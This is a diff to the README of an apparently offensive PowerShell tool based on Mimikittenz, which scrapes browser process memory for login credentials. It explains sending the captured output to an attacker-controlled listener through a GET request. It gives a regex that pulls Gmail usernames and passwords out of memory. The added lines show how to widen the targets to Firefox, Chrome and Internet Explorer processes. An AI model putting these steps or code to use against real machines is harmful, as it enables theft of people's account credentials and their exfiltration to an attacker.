@@ -6,6 +6,11 @@ The year is 2020 and alas no longer Mimikittenz works well or progressively on a
 ## Out Of Bounds Exfil
 Just set a listener running on port 80 and be sure to change the IP addresses in the source code to your attacking IP. Basically just forces a get request with the standard out of the programme and appends `/?<all of your goodness>`. Tail the logs and viola!
 
-## Adding Custom Regexes
+## Adding Custom Regexes & Processes
     [mimikittenz.MemProcInspector]::AddRegex("Gmail","identifierInput=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&password=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)")
 Use something like Burp or tamperdata to gather the parameters passed when logging into a certain application and pass them in this format within the source. Currently only grabs Gmail and Github creds but the possiblities are..  _**Endless**_
+
+The currently searched processes are defined within:
+    $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox")
+You can change this to incorpate more cote-du-jour browsers or processes of choice:
+    $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox","chrome","iexplore","meincraft")
